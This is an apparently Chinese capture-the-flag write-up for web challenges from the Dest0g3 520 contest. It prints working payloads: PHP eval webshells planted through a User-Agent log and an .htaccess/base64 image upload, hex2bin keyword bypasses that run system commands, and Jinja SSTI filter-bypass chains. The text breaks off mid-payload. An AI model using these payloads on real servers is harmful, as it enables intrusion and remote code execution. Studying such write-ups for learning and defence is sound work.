@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Dest0g3 520迎新赛 - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/ctf/dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="Dest0g3 520迎新赛">
+  <meta property="og:description" content="web phpdest 日志包含 &lt;?php highlight_file(__FILE__); require_once &#39;flag.php&#39;; if(isset($_GET[&#39;file&#39;])) { require_once($_GET[&#39;file&#39;]); } 倒是很久没有写日志包含了
+?file=/var/log/nginx/access.logUser-Agent : &lt;?php eval($_POST[1]);?&gt; 蚁剑拿flag
+又看到个姿势require_once的多次软连接绕过
+?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php EasyPHP 数组异常使用 &lt;?php highlight_file(__FILE__); include &#34;fl4g.php&#34;; $dest0g3 = $_POST[&#39;ctf&#39;]; $time = date(&#34;H&#34;); $timme = date(&#34;d&#34;); $timmme = date(&#34;i&#34;); if(($time &gt; &#34;24&#34;) or ($timme &gt; &#34;31&#34;) or ($timmme &gt; &#34;60&#34;)){ echo $fl4g; }else{ echo &#34;Try harder!&#34;; } set_error_handler( function() use(&amp;$fl4g) { print $fl4g; } ); $fl4g .= $dest0g3; ?&gt; set_error_handler () 函数设置用户定义的错误处理函数。.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T23:51:36+08:00">
+    <meta property="article:modified_time" content="2024-08-20T23:51:36+08:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Dest0g3 520迎新赛">
+  <meta name="twitter:description" content="web phpdest 日志包含 &lt;?php highlight_file(__FILE__); require_once &#39;flag.php&#39;; if(isset($_GET[&#39;file&#39;])) { require_once($_GET[&#39;file&#39;]); } 倒是很久没有写日志包含了
+?file=/var/log/nginx/access.logUser-Agent : &lt;?php eval($_POST[1]);?&gt; 蚁剑拿flag
+又看到个姿势require_once的多次软连接绕过
+?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php EasyPHP 数组异常使用 &lt;?php highlight_file(__FILE__); include &#34;fl4g.php&#34;; $dest0g3 = $_POST[&#39;ctf&#39;]; $time = date(&#34;H&#34;); $timme = date(&#34;d&#34;); $timmme = date(&#34;i&#34;); if(($time &gt; &#34;24&#34;) or ($timme &gt; &#34;31&#34;) or ($timmme &gt; &#34;60&#34;)){ echo $fl4g; }else{ echo &#34;Try harder!&#34;; } set_error_handler( function() use(&amp;$fl4g) { print $fl4g; } ); $fl4g .= $dest0g3; ?&gt; set_error_handler () 函数设置用户定义的错误处理函数。.">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/ctf/dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/" /><link rel="prev" href="https://thnpkm.github.io/posts/ctf/hitconctf/" /><link rel="next" href="https://thnpkm.github.io/posts/ctf/dasctf2022%E5%8D%81%E6%9C%88%E8%B5%9B/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Dest0g3 520迎新赛",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/ctf\/dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B\/"
+        },"genre": "posts","keywords": "","wordcount":  554 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/ctf\/dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B\/","datePublished": "2024-08-20T23:51:36+08:00","dateModified": "2024-08-20T23:51:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Dest0g3 520迎新赛</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;554 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#phpdest---日志包含">phpdest   <code>日志包含</code></a></li>
+    <li><a href="#easyphp--数组异常使用">EasyPHP  <code>数组异常使用</code></a></li>
+    <li><a href="#simplerce--hex2bin">SimpleRCE  <code>hex2bin()</code></a></li>
+    <li><a href="#funny_upload--htaccess伪协议文件上传">funny_upload  <code>.htaccess伪协议文件上传</code></a></li>
+    <li><a href="#easyssti">EasySSTI</a></li>
+    <li><a href="#middle-pickle反序列化">middle <code>pickle反序列化</code></a></li>
+    <li><a href="#pharpop">PharPOP</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="web">web</h1>
+<h2 id="phpdest---日志包含">phpdest   <code>日志包含</code></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">require_once</span> <span style="color:#e6db74">&#39;flag.php&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;file&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">require_once</span>($_GET[<span style="color:#e6db74">&#39;file&#39;</span>]);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>倒是很久没有写日志包含了</p>
+<pre tabindex="0"><code>?file=/var/log/nginx/access.log
+User-Agent : &lt;?php eval($_POST[1]);?&gt;
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211222027382.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211222027382.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211222027382.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211222027382.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211222027382.png"
+        title="image-20221122202548423" /></p>
+<p>蚁剑拿flag</p>
+<p>又看到个姿势<code>require_once的多次软连接绕过</code></p>
+<pre tabindex="0"><code>?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
+</code></pre><h2 id="easyphp--数组异常使用">EasyPHP  <code>数组异常使用</code></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;fl4g.php&#34;</span>;
+</span></span><span style="display:flex;"><span>$dest0g3 <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ctf&#39;</span>];
+</span></span><span style="display:flex;"><span>$time <span style="color:#f92672">=</span> <span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#34;H&#34;</span>);
+</span></span><span style="display:flex;"><span>$timme <span style="color:#f92672">=</span> <span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#34;d&#34;</span>);
+</span></span><span style="display:flex;"><span>$timmme <span style="color:#f92672">=</span> <span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#34;i&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(($time <span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;24&#34;</span>) <span style="color:#66d9ef">or</span> ($timme <span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;31&#34;</span>) <span style="color:#66d9ef">or</span> ($timmme <span style="color:#f92672">&gt;</span> <span style="color:#e6db74">&#34;60&#34;</span>)){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $fl4g;
+</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Try harder!&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_error_handler</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span>() <span style="color:#66d9ef">use</span>(<span style="color:#f92672">&amp;</span>$fl4g) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">print</span> $fl4g;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>$fl4g <span style="color:#f92672">.=</span> $dest0g3;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p><code>set_error_handler () </code>函数<strong>设置用户定义的错误处理函数</strong>。. 注释： 如果使用该函数，会绕过标准 PHP 错误处理程序</p>
+<p>上面时间的逻辑感觉动不了。触发<code>set_error_handler ()</code>也能打印flag</p>
+<p>操作这里<code>$dest0g3 = $_POST['ctf'];</code></p>
+<p><code>$fl4g .= $dest0g3;</code>不能处理数组，就会报错</p>
+<pre tabindex="0"><code>post: ctf[]=1
+</code></pre><h2 id="simplerce--hex2bin">SimpleRCE  <code>hex2bin()</code></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>$aaa<span style="color:#f92672">=</span>$_POST[<span style="color:#e6db74">&#39;aaa&#39;</span>];
+</span></span><span style="display:flex;"><span>$black_list<span style="color:#f92672">=</span><span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;^&#39;</span>,<span style="color:#e6db74">&#39;.&#39;</span>,<span style="color:#e6db74">&#39;`&#39;</span>,<span style="color:#e6db74">&#39;&gt;&#39;</span>,<span style="color:#e6db74">&#39;&lt;&#39;</span>,<span style="color:#e6db74">&#39;=&#39;</span>,<span style="color:#e6db74">&#39;&#34;&#39;</span>,<span style="color:#e6db74">&#39;preg&#39;</span>,<span style="color:#e6db74">&#39;&amp;&#39;</span>,<span style="color:#e6db74">&#39;|&#39;</span>,<span style="color:#e6db74">&#39;%0&#39;</span>,<span style="color:#e6db74">&#39;popen&#39;</span>,<span style="color:#e6db74">&#39;char&#39;</span>,<span style="color:#e6db74">&#39;decode&#39;</span>,<span style="color:#e6db74">&#39;html&#39;</span>,<span style="color:#e6db74">&#39;md5&#39;</span>,<span style="color:#e6db74">&#39;{&#39;</span>,<span style="color:#e6db74">&#39;}&#39;</span>,<span style="color:#e6db74">&#39;post&#39;</span>,<span style="color:#e6db74">&#39;get&#39;</span>,<span style="color:#e6db74">&#39;file&#39;</span>,<span style="color:#e6db74">&#39;ascii&#39;</span>,<span style="color:#e6db74">&#39;eval&#39;</span>,<span style="color:#e6db74">&#39;replace&#39;</span>,<span style="color:#e6db74">&#39;assert&#39;</span>,<span style="color:#e6db74">&#39;exec&#39;</span>,<span style="color:#e6db74">&#39;$&#39;</span>,<span style="color:#e6db74">&#39;include&#39;</span>,<span style="color:#e6db74">&#39;var&#39;</span>,<span style="color:#e6db74">&#39;pastre&#39;</span>,<span style="color:#e6db74">&#39;print&#39;</span>,<span style="color:#e6db74">&#39;tail&#39;</span>,<span style="color:#e6db74">&#39;sed&#39;</span>,<span style="color:#e6db74">&#39;pcre&#39;</span>,<span style="color:#e6db74">&#39;flag&#39;</span>,<span style="color:#e6db74">&#39;scan&#39;</span>,<span style="color:#e6db74">&#39;decode&#39;</span>,<span style="color:#e6db74">&#39;system&#39;</span>,<span style="color:#e6db74">&#39;func&#39;</span>,<span style="color:#e6db74">&#39;diff&#39;</span>,<span style="color:#e6db74">&#39;ini_&#39;</span>,<span style="color:#e6db74">&#39;passthru&#39;</span>,<span style="color:#e6db74">&#39;pcntl&#39;</span>,<span style="color:#e6db74">&#39;proc_open&#39;</span>,<span style="color:#e6db74">&#39;+&#39;</span>,<span style="color:#e6db74">&#39;cat&#39;</span>,<span style="color:#e6db74">&#39;tac&#39;</span>,<span style="color:#e6db74">&#39;more&#39;</span>,<span style="color:#e6db74">&#39;sort&#39;</span>,<span style="color:#e6db74">&#39;log&#39;</span>,<span style="color:#e6db74">&#39;current&#39;</span>,<span style="color:#e6db74">&#39;\\&#39;</span>,<span style="color:#e6db74">&#39;cut&#39;</span>,<span style="color:#e6db74">&#39;bash&#39;</span>,<span style="color:#e6db74">&#39;nl&#39;</span>,<span style="color:#e6db74">&#39;wget&#39;</span>,<span style="color:#e6db74">&#39;vi&#39;</span>,<span style="color:#e6db74">&#39;grep&#39;</span>);
+</span></span><span style="display:flex;"><span>$aaa <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_ireplace</span>($black_list,<span style="color:#e6db74">&#34;hacker&#34;</span>,$aaa);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">eval</span>($aaa);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>就是绕<code>str_ireplace($black_list,&quot;hacker&quot;,$aaa);</code></p>
+<p>1，用字符拼接 , 但是本题ban了.</p>
+<pre tabindex="0"><code>cmd=(s.y.s.t.e.m)(&#39;cat /flag&#39;);  //.在php中有连接字符串的作用，所以用来拼接字符串
+</code></pre><p>2，hex2bin() 绕过， 将16进制转为ascii,73797374656d→system</p>
+<pre tabindex="0"><code>cmd=hex2bin(&#39;73797374656d&#39;)(&#39;cat /flag&#39;);
+</code></pre><p>payload 用rev 逆序读取</p>
+<pre tabindex="0"><code>aaa=hex2bin(&#39;73797374656d&#39;)(&#39;rev /fla?&#39;);
+</code></pre><p>3.看到个骚操作  请求头信息读文件</p>
+<pre tabindex="0"><code>POST：
+aaa=show_source(next(apache_request_headers()));
+User-Agent: /flag
+</code></pre><h2 id="funny_upload--htaccess伪协议文件上传">funny_upload  <code>.htaccess伪协议文件上传</code></h2>
+<p>文件上传</p>
+<p>前端对后缀进行了检查，直接burp忽略前端校验</p>
+<p>发现可以执行.htaccess文件，正常流程走下来发现成功执行了pass.png文件 因为页面回显了GIF89a</p>
+<pre tabindex="0"><code>GIF89a
+&lt;script language=&#34;pHp&#34;&gt;
+    @eval($_POST[&#39;pass&#39;])
+&lt;/script&gt;
+</code></pre><p>但是这个马好像执行不成功 ,马换成<code>&lt;?php @eval($_POST['pass']);?&gt;</code> 会报错文件内容</p>
+<p>看来也是对&lt;?进行了检查</p>
+<p>绕过方法就是对马进行base64编码<code>PD9waHAgZXZhbCgkX1BPU1RbJ3Bhc3MnXSk7Pz4=</code></p>
+<p><code>.htaccess文件</code> 用auto_append_file配合php伪协议对文件内容解码</p>
+<p>.htaccess文件内容如下</p>
+<pre tabindex="0"><code>AddType application/x-httpd-php .png
+php_value auto_append_file &#34;php://filter/convert.base64-decode/resource=pass.png&#34;
+</code></pre><p>pass.png内容如下</p>
+<pre tabindex="0"><code>PD9waHAgZXZhbCgkX1BPU1RbJ3Bhc3MnXSk7Pz4=
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211222243418.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211222243418.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211222243418.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211222243418.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211222243418.png"
+        title="image-20221122224314076" /></p>
+<p>成功执行了pass.png文件,蚁剑连就行</p>
+<h2 id="easyssti">EasySSTI</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211222256824.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211222256824.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211222256824.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211222256824.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211222256824.png"
+        title="image-20221122225600744" /></p>
+<p>测试是 用户名这里有ssti</p>
+<p>手测一下全都ban了，其实过滤的真是非常严格了</p>
+<pre tabindex="0"><code>空格 &#39; &#34; _ [] . class, getitem，os，read，popen，pop啥的关键字
+</code></pre><p>所以打算拿这题好好学习一下bypass姿势</p>
+<p><strong>1，config 和 dict(p=a,op=b)|join() 实现</strong></p>
+<p>突破点在config没有过滤   <code>{{config}}</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211231058423.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211231058423.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211231058423.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211231058423.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211231058423.png"
+        title="image-20221123105820762" /></p>
+<p>可从{{config}} 内容字符串中找到所需字符来拼接构造字符串 <code>config|string()|list()</code> ，是可以避免用到引号不清楚为什么不需要引号</p>
+<!-- raw HTML omitted -->
+<p>举个例子，在这里可以就看到<code>C</code>，拿到下标1即可,需要<code>|attr('pop')(1)</code>来获取，使用<code>dict(p=a,op=b)|join()</code>来拼接关键字</p>
+<p>拿到列表后遍历找目标字符的下标即可</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>list1<span style="color:#f92672">=</span>[<span style="color:#f92672">..................</span>]
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> list1:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;_&#39;</span>:
+</span></span><span style="display:flex;"><span>        print(list1<span style="color:#f92672">.</span>index(i))
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>拿到_
+</span></span><span style="display:flex;"><span>{{config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">74</span>)}}
+</span></span><span style="display:flex;"><span>拿到空格
+</span></span><span style="display:flex;"><span>{{config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">7</span>)}}
+</span></span><span style="display:flex;"><span>拿到<span style="color:#f92672">/</span>
+</span></span><span style="display:flex;"><span>{{config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">279</span>)}}
+</span></span><span style="display:flex;"><span>拿到class
+</span></span><span style="display:flex;"><span>{{dict(cla<span style="color:#f92672">=</span>a,ss<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join()}}
+</span></span><span style="display:flex;"><span>拿到__class__  用<span style="color:#f92672">~</span>拼接
+</span></span><span style="display:flex;"><span>{{(config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">74</span>))<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">~</span>(dict(cla<span style="color:#f92672">=</span>a,ss<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join())<span style="color:#f92672">~</span>(config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">74</span>))<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>}}
+</span></span><span style="display:flex;"><span>以此类推
+</span></span><span style="display:flex;"><span>拿到config<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__
+</span></span><span style="display:flex;"><span>{{config<span style="color:#f92672">|</span>attr((config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">74</span>))<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">~</span>(dict(cla<span style="color:#f92672">=</span>a,ss<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join())<span style="color:#f92672">~</span>(config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span style="color:#f92672">|</span>join)(<span style="color:#ae81ff">74</span>))<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">|</span>attr((config<span style="color:#f92672">|</span>string()<span style="color:#f92672">|</span>list()<span style="color:#f92672">|</span>attr(dict(p<span style="color:#f92672">=</span>a,op<span style="color:#f92672">=</span>b)<span 